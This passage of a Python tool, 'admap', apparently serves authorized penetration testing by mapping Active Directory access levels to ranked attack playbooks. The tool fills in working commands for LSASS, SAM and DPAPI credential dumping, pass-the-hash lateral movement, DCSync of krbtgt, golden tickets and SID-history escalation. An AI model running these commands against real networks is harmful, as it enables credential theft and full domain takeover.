               "enable_xp_cmdshell;  xp_cmdshell whoami\n"
               "EXECUTE AS LOGIN = 'sa';  SELECT SYSTEM_USER;           -- impersonation\n"
               "EXEC ('xp_cmdshell ''whoami''') AT [LINKED\\INSTANCE];  -- linked-server hop"),
           tool=impacket("mssqlclient")))

    # ===================================================================== #
    #  PHASE 3 - local admin on a host
    # ===================================================================== #
    A(Tech("dump-sam", P_ADMIN, "Dump SAM + LSA secrets", MANUAL, 0,
           "Local admin > credentials > SAM/LSA",
           "Local accounts + cached secrets; a local admin hash often sprays across the fleet (PtH).",
           lambda st: st.local_admin,
           lambda st: f"{nxc} smb {st.target} {st.nxc_auth()} --sam --lsa --dpapi",
           tool=nxc_bin()))

    A(Tech("lsass", P_ADMIN, "Dump LSASS for live creds", MANUAL, 0,
           "Local admin > credentials > LSASS",
           "Plaintext/NT hashes of logged-on users -> often a path to a Domain Admin session.",
           lambda st: st.local_admin,
           lambda st: (f"{nxc} smb {st.target} {st.nxc_auth()} -M lsassy\n"
                       "# or: evil-winrm, upload a dumper, parse offline with pypykatz"),
           tool=nxc_bin()))

    A(Tech("lateral", P_ADMIN, "Lateral movement shells", MANUAL, 1,
           "Local admin > execution > remote shell",
           "Turn admin creds/hash into an interactive session.",
           lambda st: st.local_admin or st.have_creds,
           lambda st: (f"{impacket('psexec') or 'impacket-psexec'} {st.impacket_target()}\n"
                       f"{impacket('wmiexec') or 'impacket-wmiexec'} {st.impacket_target()}\n"
                       f"evil-winrm -i {st.target} -u {st.user or '<user>'} "
                       f"{'-H '+st.hash if st.hash else '-p <pass>'}"),
           tool=None))

    A(Tech("dpapi", P_ADMIN, "Loot DPAPI / browser / vault secrets", MANUAL, 2,
           "Local admin > credentials > DPAPI",
           "Masterkeys unlock saved browser passwords, RDP creds, and Credential Manager blobs.",
           lambda st: st.local_admin,
           lambda st: f"{nxc} smb {st.target} {st.nxc_auth()} --dpapi cookies --dpapi",
           tool=nxc_bin()))

    # ===================================================================== #
    #  PHASE 4 - domain dominance
    # ===================================================================== #
    A(Tech("dcsync", P_DOMAIN, "DCSync - pull the KRBTGT / any NT hash", MANUAL, 0,
           "Domain dominance > credentials > DCSync",
           "With replication rights (DA / DCSync ACL) dump every hash, including krbtgt.",
           lambda st: st.domain_admin or st.local_admin,
           lambda st: (f"{impacket('secretsdump') or 'impacket-secretsdump'} "
                       f"{st.impacket_target()} -just-dc-user {st.domain or '<dom>'}/krbtgt\n"
                       f"{nxc} smb {st.dc_ip} {st.nxc_auth()} -M ntdsutil   # full NTDS"),
           tool=impacket("secretsdump")))

    A(Tech("golden", P_DOMAIN, "Golden ticket (persistence)", MANUAL, 1,
           "Domain dominance > persistence > golden ticket",
           "With the krbtgt hash forge TGTs for any user - note the exam proof requirement first.",
           lambda st: st.domain_admin,
           lambda st: (f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <krbtgt> "
                       f"-domain-sid <SID> -domain {st.domain or '<dom>'} administrator"),
           tool=impacket("ticketer")))

    A(Tech("trust-escalate", P_DOMAIN, "Child -> parent domain escalation (SID history)", MANUAL, 2,
           "Domain dominance > trusts > child-to-parent",
           "DA on a child domain gets you Enterprise Admin: forge an inter-realm TGT with the "
           "parent's Enterprise Admins SID (519) in SID history, then DCSync the parent.",
           lambda st: st.domain_admin,
           lambda st: (
               f"# automated (needs the child krbtgt):\n"
               f"{impacket('raiseChild') or 'impacket-raiseChild'} "
               f"<child_dom>/<da_user>:<pw>@<child_dc>\n"
               "# manual - forge the inter-realm TGT by hand:\n"
               f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <child_krbtgt> "
               "-domain-sid <child_sid> -domain <child_dom> "
               "-extra-sid <parent_sid>-519 -spn krbtgt/<parent_dom> hacker\n"
               "# then DCSync the parent DC with the forged ticket"),
           tool=impacket("raiseChild")))

    return cat


# --------------------------------------------------------------------------- #
#  Command-template helpers
# --------------------------------------------------------------------------- #
def domain_dn(st):
    if not st.domain:
        return "DC=domain,DC=local"
    return ",".join(f"DC={p}" for p in st.domain.split("."))


def userlist(st):
    """A username argument for tools that accept EITHER a file or a bare name
    (e.g. netexec's `-u`). Not for tools whose argument must be a file - use
    getnpusers_target() / kerbrute_cmd() for those."""
    if st.users_file:
        return shlex.quote(st.users_file)
    if st.user:
        return shlex.quote(st.user)      # a single user is still valid input
    return "users.txt"


def getnpusers_target(st):
    """Target expression for impacket-GetNPUsers. `-usersfile` must be a real
    file, so a single held username is passed inline as `domain/user` instead
    (both forms are documented impacket usage)."""
    dom = st.domain or "<domain>"
    if st.users_file:
        return f"{dom}/ -usersfile {shlex.quote(st.users_file)}"
    if st.user:
        return f"{dom}/{shlex.quote(st.user)}"
    return f"{dom}/ -usersfile users.txt"


def kerbrute_cmd(st):
    """kerbrute userenum's positional argument is a username *wordlist file*,
    not a bare name. For a single held username, stage a one-line file first
    (kept to a single shell line so --run's no-newline guard still runs it)."""
    dom = st.domain or "<domain>"
    if st.users_file:
        return f"kerbrute userenum -d {dom} --dc {st.dc_ip} {shlex.quote(st.users_file)}"
    if st.user:
        f = "/tmp/admap_users.txt"
        return (f"printf '%s\\n' {shlex.quote(st.user)} > {f} && "
                f"kerbrute userenum -d {dom} --dc {st.dc_ip} {f}")
    return f"kerbrute userenum -d {dom} --dc {st.dc_ip} users.txt"


def bloodhound_cmd(st):
    bh = _first("bloodhound-python", "bloodhound-ce-python") or "bloodhound-python"
    secret = f"-p {shlex.quote(st.password)}" if st.password else (
        f"--hashes {shlex.quote(st.hash)}" if st.hash else "-p <pass>")
    return (f"{bh} -u {st.user or '<user>'} {secret} -d {st.domain or '<domain>'} "
            f"-ns {st.dc_ip} -c all --zip")


# Attach two small helpers to State used by the catalog (impacket cred forms
# without the trailing @host, for scripts that take -dc-ip instead).
def _impacket_target_noat(self):
    # Same token-quoting as impacket_target(); callers that append "@<host>"
    # concatenate onto a quoted token, which the shell still joins into one word.
    dom = f"{self.domain}/" if self.domain else ""
    u = self.user or "<user>"
    if self.hash:
        return f"{shlex.quote(f'{dom}{u}')} -hashes {shlex.quote(self.hash)}"
    pw = self.password if self.password is not None else "<pass>"
    return shlex.quote(f"{dom}{u}:{pw}")


State.impacket_target_noat = _impacket_target_noat


# --------------------------------------------------------------------------- #
#  Runner - only ever executes ENUM-class techniques
# --------------------------------------------------------------------------- #
async def _run(cmd, timeout):
    proc = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except ProcessLookupError:
            pass
        return 124, "[admap] timed out"
    return proc.returncode, out.decode(errors="replace")


async def run_enum(tech, st, outdir, timeout):
    """Execute one ENUM technique, tee output, report confirmed hits, and let
    the result mutate state (e.g. a landed spray unlocks phase 2)."""
    cmd = tech.command(st)
    if not cmd:
        return
    # Only run commands that are a single read-only invocation (no newlines =
    # no multi-step exploit chains leaked into the ENUM path).
    if "\n" in cmd:
        return
    info(f"run {C.BOLD}{tech.tid}{C.END}: {C.DIM}{cmd}{C.END}")
    rc, out = await _run(cmd, timeout)
    if outdir:
        path = os.path.join(outdir, f"admap_{tech.tid}_{identity_slug(st)}.txt")
        try:
            with open(path, "w") as fh:
                fh.write(f"$ {cmd}\n\n{out}")
        except OSError:
            pass
    hit = bool(tech.success and tech.success.search(out))
    if hit:
        good(f"{tech.tid}: confirmed signal in output")
        _learn(tech, out, st)
    else:
        warn(f"{tech.tid}: no confirming signal (check the saved output)")
    return hit


def _learn(tech, out, st):
    """Translate a confirmed ENUM result into state facts that re-rank later
    techniques (the only place --run changes the plan)."""
    if tech.tid in ("cred-validate",) and re.search(r"Pwn3d", out):
        st.local_admin = True
        st.facts.add("local_admin_confirmed")
        good("  -> local admin confirmed; phase 3 (dumping) is now in play")
    if tech.tid in ("kerberoast", "asrep-user", "asrep-authed", "asrep-nopreauth"):
        st.facts.add("roast_hashes")
    if tech.tid == "maq":
        m = re.search(r"MachineAccountQuota[:\s]+(\d+)", out, re.I)
        if m and int(m.group(1)) > 0:
            st.facts.add("can_add_computer")
            good(f"  -> MachineAccountQuota = {m.group(1)}: RBCD and noPac are in play")
        elif m:
            warn("  -> MachineAccountQuota = 0: RBCD/noPac need a pre-existing computer you control")
    if tech.tid == "mssql-enum" and re.search(r"sysadmin|Pwn3d", out, re.I):
        st.facts.add("mssql_admin")
        good("  -> MSSQL sysadmin/exec: xp_cmdshell path is open (see mssql-exec)")
    if re.search(r"signing:\s*False", out, re.I):
        st.facts.add("smb_signing_off")
        warn("  -> SMB signing not required: NTLM relay is viable")


# --------------------------------------------------------------------------- #
#  Rendering
# --------------------------------------------------------------------------- #
def banner(st):
    print(f"\n{C.BOLD}{C.CY}admap{C.END}  AD attack-path assistant  "
          f"{C.DIM}(Orange Cyberdefense AD mindmap){C.END}")
    who = st.user or ("<username list>" if st.users_file else "-")
    print(f"{C.GR}target{C.END} {st.target}   {C.GR}domain{C.END} {st.domain or '-'}   "
          f"{C.GR}dc{C.END} {st.dc_ip}   {C.GR}as{C.END} {who}")
    print(f"{C.GR}access level ->{C.END} {C.BOLD}{st.level()}{C.END}\n")


def render(cat, st, show_all=False):
    """Print the playbook grouped by phase, applicable techniques only."""
    shown = 0
    last_phase = None
    for t in sorted(cat, key=lambda x: (x.phase, x.prio, x.tid)):
        if not (show_all or t.applies(st)):
            continue
        if t.phase != last_phase:
            print(f"{C.BOLD}{C.B}== {t.phase} =={C.END}")
            last_phase = t.phase
        kc = KIND_COLOR.get(t.kind, "")
        pc = PRIO_COLOR.get(t.prio, "")
        avail = "" if t.tool_ok() else f"  {C.R}(missing: {t.tool}){C.END}"
        print(f"  {pc}*{C.END} {C.BOLD}{t.name}{C.END}  {kc}[{t.kind}]{C.END}{avail}")
        print(f"      {C.DIM}{t.branch}{C.END}")
        print(f"      {t.why}")
        cmd = t.command(st)
        if cmd:
            for line in cmd.split("\n"):
                print(f"      {C.G}${C.END} {line}")
        print()
        shown += 1
    if not shown:
        warn("no techniques match this state - try --all to see the full catalog")
    else:
        legend = (f"{KIND_COLOR[ENUM]}[ENUM]{C.END} auto-runnable  "
                  f"{KIND_COLOR[SPRAY]}[SPRAY]{C.END} lockout risk, manual  "
                  f"{KIND_COLOR[MANUAL]}[MANUAL]{C.END} you run it")
        print(f"{C.DIM}{legend}{C.END}")


def write_markdown(cat, st, path):
    """Drop the playbook into the box workspace / notes as ad_playbook.md."""
    lines = [f"# AD attack-path playbook - {st.target}", "",
             f"- **Domain:** {st.domain or '-'}  ", f"- **DC:** {st.dc_ip}  ",
             f"- **Identity:** {st.user or st.users_file or '-'}  ",
             f"- **Access level:** {st.level()}  ",
             f"- **Generated:** {datetime.now():%Y-%m-%d %H:%M}  ",
             "- **Reference:** Orange Cyberdefense AD mindmap", "",
             "> `[ENUM]` safe/read-only · `[SPRAY]` lockout risk · "
             "`[MANUAL]` exploitation - run by hand.", ""]
    last = None
    for t in sorted(cat, key=lambda x: (x.phase, x.prio, x.tid)):
        if not t.applies(st):
            continue
        if t.phase != last:
            lines += [f"## {t.phase}", ""]
            last = t.phase
        lines.append(f"### {t.name}  `[{t.kind}]`")
        lines.append(f"*{t.branch}* — {t.why}")
        cmd = t.command(st)
        if cmd:
            lines += ["", "```bash", cmd, "```", ""]
        else:
            lines.append("")
    try:
        with open(path, "w") as fh:
            fh.write("\n".join(lines) + "\n")
        good(f"playbook written -> {path}")
    except OSError as e:
        bad(f"could not write {path}: {e}")


# --------------------------------------------------------------------------- #
#  Workspace discovery (match reconx's flat single-host layout)
# --------------------------------------------------------------------------- #
def default_outdir(st):
    """Prefer a reconx box workspace if we're standing in one, else cwd."""
    candidates = [
        os.path.join(os.getcwd(), "scans", "reconx"),   # inside a box workspace
        os.getcwd(),
    ]
    for c in candidates:
        if os.path.isdir(c):
            return c
    return os.getcwd()


def identity_slug(st):
    """A filesystem-safe tag for the identity this run used, so repeated runs
    against the same host with different credentials don't clobber each other's
    output. Keyed on the username (or userlist / anon), with a .local marker so
    a local account and a domain account of the same name stay distinct."""
    if st.user:
        base = st.user
    elif st.users_file:
        base = "list-" + os.path.splitext(os.path.basename(st.users_file))[0]
    else:
        return "anon"
    slug = re.sub(r"[^A-Za-z0-9._-]", "_", base).strip("._") or "id"
    if st.local_auth:
        slug += ".local"
    return slug


# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #
def parse_args(argv):
    p = argparse.ArgumentParser(
        prog="admap",
        description="AD attack-path assistant - maps your access to the Orange "
                    "Cyberdefense AD mindmap and emits a ranked, filled-in playbook.",
        epilog="Authorized targets only. ENUM steps are read-only; exploitation "
               "is printed, never auto-run.")
    p.add_argument("target", help="DC or member host (IP or hostname)")
    p.add_argument("-d", "--domain", help="AD domain FQDN, e.g. corp.local")
    p.add_argument("--dc-ip", help="DC IP (defaults to target)")
    p.add_argument("-u", "--user", help="username you hold")
    p.add_argument("-p", "--password", help="password you hold")
    p.add_argument("-H", "--hash", help="NT or LM:NT hash (pass-the-hash)")
    p.add_argument("--users", help="file of usernames (for spray / AS-REP / enum)")
    p.add_argument("--local-auth", action="store_true",
                   help="treat the credential as a LOCAL account, not domain")
    # access-level assertions
    p.add_argument("--anon", action="store_true",
                   help="you have no credentials (default when none are given)")
    p.add_argument("--local-admin", action="store_true",
                   help="you are already local admin on target (unlocks phase 3)")
    p.add_argument("--domain-admin", action="store_true",
                   help="you have DA / DCSync rights (unlocks phase 4)")
    # behaviour
    p.add_argument("--run", action="store_true",
                   help="auto-run the [ENUM] steps (read-only) and re-rank on results")
    p.add_argument("--dry-run", action="store_true",
                   help="print the plan only; run nothing (default behaviour)")
    p.add_argument("--all", action="store_true",
                   help="show the full catalog regardless of current state")
    p.add_argument("-o", "--outdir", help="where to save run output + playbook")
    p.add_argument("--no-md", action="store_true", help="don't write ad_playbook.md")
    p.add_argument("--timeout", type=int, default=300,
                   help="per-command timeout for --run (seconds, default 300)")
    p.add_argument("--no-color", action="store_true")
    return p.parse_args(argv)


async def amain(argv):
    args = parse_args(argv)
    if args.no_color or not sys.stdout.isatty():
        C.strip()
        KIND_COLOR.update({k: "" for k in KIND_COLOR})
        PRIO_COLOR.update({k: "" for k in PRIO_COLOR})

    st = State(args)
    cat = build_catalog()

    banner(st)

    if not nxc_bin():
        warn("netexec/crackmapexec not found - SMB/LDAP ENUM commands are printed "
             "but can't be auto-run.")

    render(cat, st, show_all=args.all)

    outdir = args.outdir or default_outdir(st)
    try:
        os.makedirs(outdir, exist_ok=True)
    except OSError:
        outdir = os.getcwd()

    slug = identity_slug(st)
    md_path = os.path.join(outdir, f"ad_playbook_{slug}.md")
    if not args.no_md:
        write_markdown(cat, st, md_path)

    if args.run and not args.dry_run:
        print()
        info(f"--run: executing [ENUM] steps only, output -> {outdir} "
             f"(tagged '{slug}')")
        # Iterate; _learn() may flip state, so recompute applicability each loop.
        ran = set()
        progressed = True
        while progressed:
            progressed = False
            for t in sorted(cat, key=lambda x: (x.phase, x.prio, x.tid)):
                if t.tid in ran or t.kind != ENUM or not t.applies(st):
                    continue
                if not t.tool_ok():
                    ran.add(t.tid)
                    continue
                await run_enum(t, st, outdir, args.timeout)
                ran.add(t.tid)
                progressed = True        # state may have changed -> re-sweep
        print()
        good("--run complete. Re-rendering with what we learned:\n")
        render(cat, st)
        if not args.no_md:
            write_markdown(cat, st, md_path)
    elif not args.run:
        print(f"\n{C.DIM}Tip: add --run to auto-execute the [ENUM] steps "
              f"(read-only).{C.END}")


def main():
    try:
        asyncio.run(amain(sys.argv[1:]))
    except KeyboardInterrupt:
        print()
        bad("interrupted")
        sys.exit(130)


if __name__ == "__main__":
    main()
